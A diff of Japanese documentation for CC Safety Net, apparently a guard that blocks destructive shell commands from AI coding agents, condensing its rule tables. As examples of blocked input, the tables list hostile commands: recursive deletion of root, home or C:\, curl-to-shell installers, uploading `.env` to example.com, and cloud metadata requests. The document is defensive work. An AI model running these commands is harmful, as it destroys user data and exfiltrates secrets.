 | リポジトリルートでの `find . -name '*.pyc' -exec rm {} +` | 許可 | |
 
-`-name` や `-iname` のフィルターでブロックが解除されるのは、`.git` 内にそのフィルターに一致するエントリがない場合だけです。`.git` には `HEAD` という名前のファイルがあるため、その行は引き続きブロックされます。
+`-name` や `-iname` のフィルターでブロックが解除されるのは、`.git` 内にそのフィルターに一致するエントリがない場合だけです。`.git` には `HEAD` ファイルがあるため、`-name HEAD` はブロックされます。
 
 <Note>
   このガードが対象とするのは、作業ディレクトリから見て最も近い上位のリポジトリと、プロジェクト設定を含むディレクトリから見て最も近い上位のリポジトリです。その下に入れ子になった別のリポジトリは対象外です。
@@ -379,7 +363,7 @@ Only the user may apply a policy proposal, because it rewrites the configuration
 
 `Remove-Item` のルールは、シェルモードが `powershell` または `auto` のときに適用されます。`posix` モードで適用されるのは、`git.reset-hard` のようなシェル共通のルールだけです。別名や省略したパラメーターも解決するため、`ri . -r -fo` もブロックされます。
 
-`auto` モードでは、PowerShell として読めるコマンドを POSIX シェルのコマンドとしても検査し、どちらかの読み方でブロックされればブロックします。`Get-Content x#; git reset --hard` を PowerShell として読むと `#` はコメントの開始になりますが、bash は `git reset` を実行します。そのため、このコマンドは `git.reset-hard` でブロックされます。
+`auto` モードでは、PowerShell として読めるコマンドを POSIX シェルのコマンドとしても検査し、どちらかの読み方でブロックされればブロックします。たとえば `Get-Content x#; git reset --hard` は `git.reset-hard` でブロックされます。PowerShell は `#` をコメントとして読みますが、bash は `git reset` を実行するためです。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
@@ -392,9 +376,7 @@ Only the user may apply a policy proposal, because it rewrites the configuration
 | `Remove-Item $target -Recurse -Force`、`Remove-Item @params -Recurse -Force` | Strict | `powershell.remove-item-recursive-force-dynamic-target` |
 | `Get-ChildItem . -Recurse \| Remove-Item -Force` | Strict | `powershell.remove-item-pipeline-dynamic-target` |
 | `Remove-Item ./cache -Recurse -Force` | Paranoid rm | `powershell.remove-item-recursive-force-paranoid` |
-| `Remove-Item /tmp/test-dir -Recurse -Force` | 許可 | |
-| `Remove-Item file.txt` | 許可 | |
-| `Remove-Item . -Recurse -Force -WhatIf` | 許可 | |
+| `Remove-Item /tmp/test-dir -Recurse -Force`、`Remove-Item file.txt`、`Remove-Item . -Recurse -Force -WhatIf` | 許可 | |
 
 `-WhatIf`、`-WhatIf:$true`、`-wi` を付けた `Remove-Item` はドライランになるため、ブロックされません。`-WhatIf:$false` を指定すると再びブロックされます。PowerShell のワイルドカードはドットで始まるエントリにも一致するため、ワイルドカードが `.git` に及ぶことがあります。
 
@@ -406,11 +388,9 @@ CC Safety Net は、`bash -c`、`sh -c`、`sudo`、`env` などのラッパー�
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `bash -c 'git reset --hard'` | ブロック | `git.reset-hard` |
+| `bash -c 'git reset --hard'`、`/usr/bin/env git reset --hard` | ブロック | `git.reset-hard` |
 | `sh -lc 'rm -rf /'` | 致命的 | `rm.recursive-force-root-or-home` |
-| `/usr/bin/env git reset --hard` | ブロック | `git.reset-hard` |
-| `python -c 'import os; os.system("rm -rf /")'` | ブロック | `interpreter.dangerous-command` |
-| `node -e 'require("child_process").exec("git reset --hard")'` | ブロック | `interpreter.dangerous-command` |
+| `python -c 'import os; os.system("rm -rf /")'`、`node -e 'require("child_process").exec("git reset --hard")'` | ブロック | `interpreter.dangerous-command` |
 | `python -c "print(1)"` | 許可 | |
 | `bash -c "$CMD"` | ブロック | `analysis.dynamic-shell-source` |
 | `bash -c -x 'rm -rf build'`、`bash +n -c 'ls'` | ブロック | `analysis.dynamic-shell-source` |
@@ -419,7 +399,7 @@ CC Safety Net は、`bash -c`、`sh -c`、`sudo`、`env` などのラッパー�
 | `git reset $(printf --hard)` | Standard のみ | `shell.dynamic-structure` |
 | `W='rm -rf ~'; echo "$W"` | Standard のみ | `raw-text.dangerous-command` |
 
-`bash -n` は構文を確認するだけで何も実行しないため、`-n` と `-c` だけを渡したシェルは、スクリプトの内容にかかわらず許可されます。それ以外のオプションがあれば、スクリプトを通常どおり検査します。どの語がスクリプトになるかを変えうるオプションや、`-n` を打ち消しうるオプションは、すべてのレベルで拒否します。具体的には、`+` で始まるオプション、`-c` と同じまとまりにある `o` や `O`、スクリプトの語が `-` または `+` で始まる `-c` です。
+`bash -n` は構文を確認するだけなので、`-n` と `-c` だけを渡したシェルは、スクリプトの内容にかかわらず許可されます。どの語がスクリプトになるかを変えうるオプションや `-n` を打ち消しうるオプション（`+` で始まるオプションなど）は、`analysis.dynamic-shell-source` としてブロックされます。
 
 この方法で検査するインタープリターは、`python`、`python2`、`python3`、`node`、`ruby`、`perl` です。`python -c "print(1)"` も含めてインタープリターのワンライナーをすべてブロックするには、[paranoid のインタープリターチェック](/ja/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1)を有効にします。そのブロックには `interpreter.one-liner-paranoid` が付きます。
 
@@ -432,16 +412,21 @@ CC Safety Net は、`bash -c`、`sh -c`、`sudo`、`env` などのラッパー�
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `python3 -c "import shutil; shutil.rmtree('/')"` | ブロック | `interpreter.dangerous-command` |
-| `perl -e 'use File::Path; rmtree($ENV{HOME})'` | ブロック | `interpreter.dangerous-command` |
-| `ruby -e "require 'fileutils'; FileUtils.rm_rf(Dir.home)"` | ブロック | `interpreter.dangerous-command` |
 | `node -e "require('fs').rmSync(require('os').homedir(), {recursive: true})"` | ブロック | `interpreter.dangerous-command` |
 | `python3 -c "import shutil; shutil.rmtree('dist')"` | 許可 | |
 | `python3 -c "import shutil,os; shutil.rmtree(os.path.join(os.path.expanduser('~'), 'build'))"` | 許可 | |
 | `node -e "require('fs').rmSync(require('os').homedir())"` | 許可 | |
 
-読み取る削除の呼び出しは、Python の `shutil.rmtree`、Perl の `rmtree` と `remove_tree`、Ruby の `FileUtils.rm_rf`、`rm_r`、`remove_dir`、`remove_entry`、`remove_entry_secure`、そして `recursive: true` を付けた Node の `rm`、`rmSync`、`rmdir`、`rmdirSync` です。第 1 引数は、リテラルのルートまたはホームのパスか、ホームを表す次の式のいずれかでなければなりません。`os.path.expanduser('~')`、`Path.home()`、`os.environ['HOME']`、`os.getenv('HOME')`、`$ENV{HOME}`、`os.homedir()`、`process.env.HOME`、`Dir.home`、`ENV['HOME']` です。
+| 言語 | 検査する呼び出し |
+| --- | --- |
+| Python | `shutil.rmtree` |
+| Perl | `rmtree`、`remove_tree` |
+| Ruby | `FileUtils.rm_rf`、`rm_r`、`remove_dir`、`remove_entry`、`remove_entry_secure` |
+| Node | `recursive: true` を付けた `rm`、`rmSync`、`rmdir`、`rmdirSync` |
 
-ホームの下のサブディレクトリを連結した場合のように、コードが実行時に組み立てる対象は許可されたままです。リテラルの `~` も同じで、ここに挙げた API はどれも展開しません。`recursive: true` を付けない Node の削除も許可されます。CC Safety Net はコードのテキストから呼び出しを見つけるため、文字列の中を含め、どこに書かれていてもブロックします。[インタープリターのワンライナーにはパースの隙間がある](/ja/guides/known-limitations#interpreter-one-liners-have-parsing-gaps)を参照してください。
+第 1 引数が、リテラルのルートまたはホームのパスか、次の式のいずれかであればブロックされます。`os.path.expanduser('~')`、`Path.home()`、`os.environ['HOME']`、`os.getenv('HOME')`、`$ENV{HOME}`、`os.homedir()`、`process.env.HOME`、`Dir.home`、`ENV['HOME']` です。
+
+リテラルの `~` は許可されたままです。ここに挙げた API はどれも `~` を展開しないためです。照合はコードのテキストに対して行うため、文字列の中に書かれた呼び出しもブロックします。[インタープリターのワンライナーにはパースの隙間がある](/ja/guides/known-limitations#interpreter-one-liners-have-parsing-gaps)を参照してください。
 
 ### コマンドプロンプトの本体
 
@@ -449,8 +434,7 @@ CC Safety Net は、どのシェルモードでも `cmd /c` と `cmd /k` の本�
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `cmd /c 'rmdir /s /q C:\'`、`cmd /c "del /s /q C:\*.*"` | 致命的 | `cmd.recursive-delete-root-or-home` |
-| `cmd /c 'if exist C:\ rmdir /s /q C:\'` | 致命的 | `cmd.recursive-delete-root-or-home` |
+| `cmd /c 'rmdir /s /q C:\'`、`cmd /c "del /s /q C:\*.*"`、`cmd /c 'if exist C:\ rmdir /s /q C:\'` | 致命的 | `cmd.recursive-delete-root-or-home` |
 | `cmd /c rmdir /s /q .git` | 致命的 | `cmd.recursive-delete-git-metadata` |
 | `cmd /c "rmdir /s /q \"build output\""` | 致命的 | `cmd.recursive-delete-escaped-quote` |
 | `cmd /c rmdir /s /q .` | ブロック | `cmd.recursive-delete-cwd-self` |
@@ -459,10 +443,11 @@ CC Safety Net は、どのシェルモードでも `cmd /c` と `cmd /k` の本�
 | `cmd /c del /s /q *.log` | Strict | `cmd.recursive-delete-dynamic-target` |
 | `cmd /c rmdir /s /q build` | Paranoid rm | `cmd.recursive-delete-paranoid` |
 | `cmd /c 'cd /d C:\Users && rmdir /s /q build'`、`cmd /c 'rd/s/q C:\'` | ブロック | `analysis.dynamic-shell-source` |
-| `cmd /c 'if exist node_modules rmdir /s /q node_modules'` | 許可 | |
-| `cmd /c 'del /q build.log'` | 許可 | |
+| `cmd /c 'if exist node_modules rmdir /s /q node_modules'`、`cmd /c 'del /q build.log'` | 許可 | |
 
-cmd は `\"` をエスケープとして扱わないため、引用符で囲んだ対象が分割され、ドライブのルートを指すことがあります。そのため、本体に `\"` を含む再帰削除は致命的として扱われます。ブロックメッセージは、パスを 1 つずつ引用符で囲んだ引数にするか、代わりに `Remove-Item -LiteralPath` を使うよう求めます。`^`、`%`、`!`、`cd`、引用符で囲んだ `&` や `|` を併用する再帰削除は、検証できない実行元として拒否します。
+cmd は `\"` をエスケープとして扱わないため、引用符で囲んだ対象が分割され、ドライブのルートを指すことがあります。本体に `\"` を含む再帰削除は致命的として扱われ、ブロックメッセージは、パスを 1 つずつ引用符で囲むか、`Remove-Item -LiteralPath` を使うよう案内します。
+
+`^`、`%`、`!`、`cd`、引用符で囲んだ `&` や `|` を併用する再帰削除は、検証できない実行元として拒否します。
 
 この読み取りはテキストの照合なので、何も削除しない `cmd /c 'echo rmdir /s /q C:\'` もブロックされます。読み取りの対象外については[既知の制限](/ja/guides/known-limitations#windows-command-prompt-and-nested-powershell)を参照してください。
 
@@ -475,14 +460,10 @@ cmd は `\"` をエスケープとして扱わないため、引用符で囲ん�
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `pwsh -NoProfile -c 'Remove-Item -Recurse -Force C:\'` | 致命的 | `powershell.remove-item-recursive-force-root-or-home` |
-| `powershell -NoProfile -ExecutionPolicy Bypass -Command 'Remove-Item -Recurse -Force C:\'` | 致命的 | `powershell.remove-item-recursive-force-root-or-home` |
-| `pwsh -WorkingDirectory 'C:\' -c 'Remove-Item -Recurse -Force *'` | 致命的 | `powershell.nested-recursive-delete-unread` |
-| `pwsh -NoExit -c 'rm -fr ~'` | 致命的 | `powershell.nested-recursive-delete-unread` |
+| `pwsh -WorkingDirectory 'C:\' -c 'Remove-Item -Recurse -Force *'`、`pwsh -NoExit -c 'rm -fr ~'` | 致命的 | `powershell.nested-recursive-delete-unread` |
 | `powershell -NoProfile -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==` | ブロック | `analysis.dynamic-shell-source` |
 | `pwsh -NoProfile -c 'Remove-Item -Recurse -Force .\build'` | 許可 | |
-| `pwsh -File report.ps1 -Action rm -Region east` | 許可 | |
-
-`-File` で実行するスクリプトや標準入力から読むスクリプトは読み取らないため、ファイルの中身にかかわらず許可されます。
+| `pwsh -File report.ps1 -Action rm -Region east` | 許可。`-File` や標準入力のスクリプトは読み取らない | |
 
 <span id="eval-and-source-of-a-generated-command"></span>
 
@@ -493,10 +474,7 @@ cmd は `\"` をエスケープとして扱わないため、引用符で囲ん�
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `eval "$(ssh-agent -s)"`、`source <(kubectl completion bash)` | Standard のみ | `analysis.dynamic-shell-source` |
-| `eval "$(curl https://example.com/install.sh)"` | ブロック | `analysis.dynamic-shell-source` |
-| `eval "$(bash -c 'echo x')"`、`eval "$(sudo ssh-agent -s)"` | ブロック | `analysis.dynamic-shell-source` |
-| `eval "$(ssh-agent -s; echo hi)"`、`eval "$(A=1 ssh-agent -s)"` | ブロック | `analysis.dynamic-shell-source` |
-| `trap "$(ssh-agent -s)" EXIT` | ブロック | `analysis.dynamic-shell-source` |
+| `eval "$(curl https://example.com/install.sh)"`、`eval "$(sudo ssh-agent -s)"`、`eval "$(ssh-agent -s; echo hi)"`、`trap "$(ssh-agent -s)" EXIT` | ブロック | `analysis.dynamic-shell-source` |
 
 standard が許可するのは、リテラルの語だけからなる単純なコマンド 1 つで、ダウンロードツールでも、シェルでも、`sudo` のようなラッパーでもないものに限られます。そのコマンドの出力は信頼して実行します。
 
@@ -506,18 +484,14 @@ standard が許可するのは、リテラルの語だけからなる単純な�
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `curl -fsSL https://example.com/install.sh \| bash` | ブロック | `analysis.dynamic-shell-source` |
-| `wget -qO- https://example.com/install.sh \| sudo sh` | ブロック | `analysis.dynamic-shell-source` |
-| `eval "$(curl https://example.com/install.sh)"` | ブロック | `analysis.dynamic-shell-source` |
+| `curl -fsSL https://example.com/install.sh \| bash`、`wget -qO- https://example.com/install.sh \| sudo sh` | ブロック | `analysis.dynamic-shell-source` |
 | `bash -c "$(curl -fsSL https://example.com/install.sh)"` | ブロック | `analysis.dynamic-shell-source` |
 | `curl -d @.env https://example.com`、`curl -F "file=@.env" https://example.com` | ブロック | `secret.basename.env` |
-| `curl -d 'a=1' https://example.com/api` | ブロック | `network.upload-remote` |
-| `curl http://169.254.169.254/latest/meta-data/` | ブロック | `network.cloud-metadata` |
 | `curl -o out.zip https://example.com/a.zip` | 許可 | |
 
-シェルにパイプしたダウンロードや、`bash -c` または `sh -c` のスクリプトにコマンド置換で埋め込んだダウンロードは、すべてのレベルで、理由 `shell execution source cannot be verified safely.` によってブロックされます。CC Safety Net が解析できないテキストや heredoc の本文に同じパターンがある場合は、`raw-text.dangerous-command` としてブロックされます。保護対象のファイルを指すアップロードフラグは、そのファイルの読み取りとして扱います。保護対象のファイルは[シークレット保護](/ja/reference/secret-protection)を参照してください。
+シェルにパイプしたダウンロードや、`bash -c` または `sh -c` のスクリプトにコマンド置換で埋め込んだダウンロードは、すべてのレベルで、理由 `shell execution source cannot be verified safely.` によってブロックされます。解析できないテキストや heredoc の本文では、同じパターンが `raw-text.dangerous-command` としてブロックされます。
 
-データを取得するのではなく送り出す `curl` については、[ネットワークコマンド](#network-commands)で説明しています。ループバック以外のホストへのアップロードはブロックされ、クラウドのメタデータエンドポイントへのリクエストもブロックされます。
+ループバック以外のホストへのアップロードと、クラウドのメタデータエンドポイントへのリクエストもブロックされます。[ネットワークコマンド](#network-commands)を参照してください。
 
 <span id="heredocs"></span>
 
@@ -534,11 +508,15 @@ standard が許可するのは、リテラルの語だけからなる単純な�
 | `python3 - <<'PY'` | standard では Python のコードとして検査、strict と paranoid ではブロック |
 | `bash <<'EOF'`、`sh <<EOF`、`bash -s <<'EOF'` | standard ではシェルのコマンドとして検査、strict と paranoid ではブロック |
 
-standard では、それ以外の heredoc の本文はテキストとして破壊的なパターンを検査します。
+standard では、それ以外の heredoc の本文を、テキストとして破壊的なパターンと照合します。デリミタが引用符で囲まれているか、本文に `$`、バッククォート、バックスラッシュが含まれない場合、本文は展開されません。
 
-standard が本文をテキストではなくコマンドとして検査する唯一のケースは、シェルが heredoc をプログラムとして読み込む場合です。条件は、本文が展開されないこと（デリミタが引用符で囲まれているか、本文に `$`、バッククォート、バックスラッシュが含まれないこと）と、その heredoc が標準入力への最後の入力リダイレクトであることです。この場合、CC Safety Net は本文の各コマンドをトップレベルのコマンドと同じように解析します。そのため、アップロード、メタデータへのリクエスト、`unshare -U`、`git reset --hard` が本文にあれば、それぞれのルールでブロックされます。この解析で何も見つからなければテキストの検査も続けて実行するため、`rm -rf "$1"` のような本文は `raw-text.dangerous-command` としてブロックされます。`bash -c '…' <<'EOF'` や `bash script.sh <<'EOF'` では、heredoc はプログラムではなくデータとして扱われるため、これには当てはまりません。
+シェルが展開されない heredoc をプログラムとして読み込む場合（`bash <<'EOF'` など）、standard は本文の各コマンドをトップレベルのコマンドと同じように解析します。本文に `git reset --hard` やアップロードがあれば、それぞれのルールでブロックされます。
 
-strict と paranoid で heredoc が許可されるのは、コマンドに含まれる heredoc が標準入力への 1 つだけで、読み取り側が上記のいずれかであり、本文が展開されない場合だけです。展開されないとは、デリミタが引用符で囲まれているか、本文に `$`、バッククォート、バックスラッシュが含まれないことを指します。デリミタに引用符がなく、本文にこれらの文字が含まれる場合は、次の理由で拒否されます。
+<Accordion title="standard でのシェルの heredoc の詳細">
+  その heredoc は、標準入力への最後の入力リダイレクトである必要があります。コマンドとしての解析で何も見つからなくてもテキストの検査は実行するため、`rm -rf "$1"` のような本文は `raw-text.dangerous-command` としてブロックされます。
+</Accordion>
+
+strict と paranoid で heredoc が許可されるのは、コマンドに含まれる heredoc が標準入力への 1 つだけで、読み取り側が上記のいずれかであり、本文が展開されない場合だけです。デリミタに引用符がなく、本文に `$`、バッククォート、バックスラッシュのいずれかが含まれる場合は、次の理由で拒否されます。
 
 ```text
 Unquoted heredoc input is not supported safely. Quote the delimiter or ask the user to verify.
@@ -554,25 +532,24 @@ This heredoc form or stdin consumer is not supported safely. Use a quoted heredo
 
 ## ファイルから実行するスクリプト
 
-CC Safety Net は、すべての安全レベルで、コマンドが実行するシェルスクリプトを読み取り、その中身を検査します。対象は `sh x.sh` と `bash x.sh`、`source x.sh` と `. x.sh`、`./x.sh` のようにスクリプトのパスを直接指定する形です。スクリプトは、`cat > x.sh <<'EOF' … EOF && bash x.sh` のように同じコマンドの heredoc が書き出したものでも、すでにディスク上にあるファイルでもかまいません。
+CC Safety Net は、すべての安全レベルで、コマンドが実行するシェルスクリプト（`sh x.sh`、`bash x.sh`、`source x.sh`、`. x.sh`、`./x.sh` など）を読み取り、その中身を検査します。スクリプトは、ディスク上のファイルでも、`cat > x.sh <<'EOF' … EOF && bash x.sh` のように同じコマンドの heredoc が書き出したものでもかまいません。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `sh deploy.sh`（ファイルの 3 行目がリモートホストにアップロードする） | ブロック | `network.upload-remote` |
-| 同じファイルに対する `source deploy.sh`、`. deploy.sh`、`./deploy.sh` | ブロック | `network.upload-remote` |
+| `sh deploy.sh`、`source deploy.sh`、`./deploy.sh`（ファイルの 3 行目がリモートホストにアップロードする） | ブロック | `network.upload-remote` |
 | `bash clean.sh`（ファイルが echo しかしない） | 許可 | |
 | `cp lib/deploy.sh scripts/ && sh scripts/deploy.sh` | 許可 | |
 | `python3 tool.py` | 許可 | |
 
-ブロックの理由には、ファイルと行番号を示します。理由は `deploy.sh:3: ` で始まり、その後にルール自身のテキストが続きます。パスはコマンドに書かれたとおりの表記で、行番号は 1 から始まります。スクリプトがさらに別のスクリプトを実行している場合は、最も内側のファイルと行番号を示します。[`explain`](/ja/reference/cli/explain) は、パスとファイルのバイトサイズを持つ `script-file` ステップを 1 つ追加します。トレースにスクリプトのテキストが含まれることはありません。ツール呼び出しがそのテキストを渡していないためです。
+ブロックの理由には、ファイルと 1 から始まる行番号を示します。理由は `deploy.sh:3: ` で始まり、その後にルール自身のテキストが続きます。スクリプトがさらに別のスクリプトを実行している場合は、最も内側のファイルと行番号を示します。[`explain`](/ja/reference/cli/explain) は、パスとファイルのバイトサイズを持つ `script-file` ステップを追加しますが、スクリプトのテキストは含めません。
 
-`./x.sh` のようにパスで実行するスクリプトを読み取るのは、shebang 行がない場合か、`#!/bin/sh` のようなシェルの shebang がある場合だけです。それ以外の shebang があれば、そのファイルはシェルスクリプトではありません。`sh x.sh` と `source x.sh` はコマンド自体がインタープリターを指定しているため、shebang は関係ありません。インタープリター向けのファイルは一切読まないので、`python3 tool.py` はファイルの内容にかかわらず許可されます。
+`./x.sh` を読み取るのは、shebang 行がない場合か、`#!/bin/sh` のようなシェルの shebang がある場合だけです。`sh x.sh` と `source x.sh` では shebang を見ません。インタープリター向けのファイルは一切読まないので、`python3 tool.py` はファイルの内容にかかわらず許可されます。
 
-standard では、リテラルの代入から組み立てたスクリプトのパスもたどります（`S=/tmp/run; … bash $S/x.sh` など）。値は `~`、`$HOME`、`$PWD` で始まっていてもよく、macOS では `$(getconf DARWIN_USER_TEMP_DIR)` も使えます。
+コマンドをブロックするのは、スクリプト内にルールと具体的に一致する箇所があった場合だけです。`eval "$(…)"` のように検証できない行で解析が止まった場合は、外側のコマンドの判定がそのまま残ります。
 
-コマンドをブロックするのは、スクリプト内にルールと具体的に一致する箇所があった場合だけです。最初に解析が止まる行が、`eval "$(…)"` のように CC Safety Net が検証できない行であれば、解析はそこで終わり、外側のコマンドの判定がそのまま残ります。
-
-strict と paranoid で解析が止まる行は standard より多く、`rm -rf "$target"` も含まれます。paranoid では、インタープリターのワンライナーもすべて含まれます。こうした行で解析が終わった場合、CC Safety Net は追加のチェックを外してスクリプトをもう一度解析します。そのため、strict と paranoid でだけ解析が止まる行が、その先にある具体的な一致を隠すことはありません。
+<Accordion title="変数から組み立てたスクリプトのパス">
+  standard では、リテラルの代入から組み立てたスクリプトのパスもたどります（`S=/tmp/run; … bash $S/x.sh` など）。値は `~`、`$HOME`、`$PWD` で始まっていてもよく、macOS では `$(getconf DARWIN_USER_TEMP_DIR)` も使えます。
+</Accordion>
 
 ### スクリプトを読み取らない場合
 
@@ -580,11 +557,15 @@ strict と paranoid で解析が止まる行は standard より多く、`rm -rf 
 
 - パスが通常のファイルでない、256 KB を超える、NUL バイトを含む、または `/dev`、`/proc`、`/sys` の配下にある。
 - 同じコマンドの前の部分が、そのパスまたはその上位ディレクトリに書き込んだ可能性がある。
-- そのコマンドがすでに 64 個のスクリプトを読み終えている。1 つのコマンドで読み取るスクリプトは、入れ子の読み取りも含めて 1 つの上限で数えるため、自分自身を実行するスクリプトでも回数は有限に収まります。
+- そのコマンドがすでに 64 個のスクリプトを読み終えている（入れ子の読み取りも含む）。
 
-CC Safety Net が追跡する書き込みは、出力リダイレクトと、`cp`、`mv`、`install`、`ln`、`sed -i`、`curl`、`wget`、`tee` のオペランドです。`sed -i`、`curl`、`wget`、`tee` では、コマンドより後ろのオペランドがすべて対象です。`cp`、`mv`、`install`、`ln` では宛先だけが対象で、宛先は `-t` か `--target-directory` があればその値、なければ最初のオペランドより後ろのすべてです。そのため `cp lib/deploy.sh scripts/ && sh scripts/deploy.sh` は何も読み取らず、`cp scripts/deploy.sh /tmp/backup.sh && sh scripts/deploy.sh` では `scripts/deploy.sh` を読み取ります。
+<Accordion title="読み取りを止める先行の書き込み">
+  CC Safety Net が追跡する書き込みは、出力リダイレクトと、`cp`、`mv`、`install`、`ln`、`sed -i`、`curl`、`wget`、`tee` のオペランドです。`sed -i`、`curl`、`wget`、`tee` では、すべてのオペランドが対象です。`cp`、`mv`、`install`、`ln` では宛先だけが対象で、宛先は `-t` か `--target-directory` があればその値、なければ最初のオペランドより後ろのすべてです。
 
-CC Safety Net はスクリプトを解析する前に Windows の改行コードを正規化するため、CRLF でチェックアウトしたファイルも、同じ内容を LF で書いたファイルと同じ判定になります。これで捕捉できない範囲は、[スクリプトファイルの読み取りは可能な範囲にとどまる](/ja/guides/known-limitations#script-files-are-read-best-effort)を参照してください。
+  そのため `cp scripts/deploy.sh /tmp/backup.sh && sh scripts/deploy.sh` では `scripts/deploy.sh` を読み取ります。
+</Accordion>
+
+Windows の改行コード（CRLF）のファイルも、同じ内容を LF で書いたファイルと同じ判定になります。これで捕捉できない範囲は、[スクリプトファイルの読み取りは可能な範囲にとどまる](/ja/guides/known-limitations#script-files-are-read-best-effort)を参照してください。
 
 ## 解析できないコマンドテキスト
 
@@ -597,11 +578,11 @@ CC Safety Net はスクリプトを解析する前に Windows の改行コード
 | `dd if=/dev/zero of=/dev/sda 'oops` | ブロック、`raw-text.dangerous-command` | ブロック |
 | `echo ${ date; }` | ブロック、`analysis.strict-unparseable` | ブロック |
 
-standard では、解析できないテキストに `rm -rf`、`git reset --hard`、`dd of=/dev/`、シェルにパイプしたダウンロードなどの破壊的なパターンがないかをスキャンします。一致すると `raw-text.dangerous-command` としてブロックします。`${ list; }` の関数置換など一部のシェル構文は、コマンドが無害でも、すべてのレベルで拒否します。
+standard では、解析できないテキストに `rm -rf`、`git reset --hard`、`dd of=/dev/`、シェルにパイプしたダウンロードなどの破壊的なパターンがないかをスキャンします。一致すると `raw-text.dangerous-command` としてブロックします。`${ list; }` の関数置換など一部の構文は、コマンドが無害でも、すべてのレベルでブロックします。
 
 ### キャリッジリターンと Unicode の空白
 
-コマンドのどこかにキャリッジリターン、垂直タブ、改ページ（フォームフィード）が含まれていると、すべてのレベルで `analysis.strict-unparseable` としてブロックします。bash と zsh はこれらの文字を語の一部として扱うので、シェルと CC Safety Net とでコマンドの意味が食い違うおそれがあります。Windows の改行コード（CRLF）も該当するので、コマンドは LF の改行で送ってください。
+コマンドのどこかにキャリッジリターン、垂直タブ、改ページ（フォームフィード）が含まれていると、すべてのレベルで `analysis.strict-unparseable` としてブロックします。bash と zsh はこれらの文字を語の一部として扱うためです。Windows の改行コード（CRLF）も該当するので、コマンドは LF の改行で送ってください。
 
 ノーブレークスペースやバイトオーダーマークなどの Unicode の空白も、語と語の間にあれば同じようにブロックします。引用符の中や heredoc の本文ではただのテキストなので、全角スペースを含む `git commit -m '修正　テスト'` は許可されます。
 
@@ -611,7 +592,9 @@ standard では、解析できないテキストに `rm -rf`、`git reset --hard
 
 ## 固定の拒否 ID
 
-ルールによらない拒否もあります。コマンド解析の前に実行されるガード、解析の上限と失敗、使用できない作業ディレクトリによる拒否です。これらには固定の ID が付き、ブロックメッセージ、[監査ログ](/ja/reference/audit-log)、`explain --json` の `ruleId` フィールド、[`checkCommand`](/ja/reference/library-api) が返す拒否の `ruleId` に表示されます。これらの ID は登録済みのルールではないため、`destructive_command_protection.overrides` には指定できません。`policy check` は、いずれも `unknown destructive command rule id "<id>"` として拒否します。
+ルールによらない拒否もあります。コマンド解析の前に実行されるガード、解析の上限と失敗、使用できない作業ディレクトリによる拒否です。これらには固定の ID が付き、ルール ID が表示される場所に表示されます。[`checkCommand`](/ja/reference/library-api) が返す拒否の `ruleId` も同じです。
+
+これらの ID は登録済みのルールではないため、`destructive_command_protection.overrides` には指定できません。`policy check` は、いずれも `unknown destructive command rule id "<id>"` として拒否します。
 
 | ID | 拒否する条件 |
 | --- | --- |
@@ -623,7 +606,7 @@ standard では、解析できないテキストに `rm -rf`、`git reset --hard
 | `analysis.limit` | コマンドが、安全に解析できる上限を超える |
 | `analysis.derived-command-limit` | アナライザーが、派生コマンドの処理量の上限を超える |
 | `analysis.failed-closed` | ガードが予期せず失敗した、またはエージェントが送った内容を読み取れなかったため、フェイルクローズになった |
-| `tool-call.malformed` | ツール呼び出しにツール名がない、コマンドが空白である、または作業ディレクトリの引数が空白か文字列ではない。エージェントは引数をそろえて送り直せる |
+| `tool-call.malformed` | ツール呼び出しにツール名がない、コマンドが空白である、または作業ディレクトリが空白か文字列ではない。エージェントは引数をそろえて送り直せる |
 | `analysis.strict-unparseable` | パーサーがコマンドを受け付けない、または strict モードでコマンドを完全にはパースできない |
 | `analysis.unsupported-heredoc` | strict モードで、パーサーが対応していない heredoc 構文をコマンドが使っている |
 | `analysis.dynamic-shell-source` | シェルが、リテラル文字列ではないスクリプトテキストを実行する（`sh -c "$CMD"` など） |
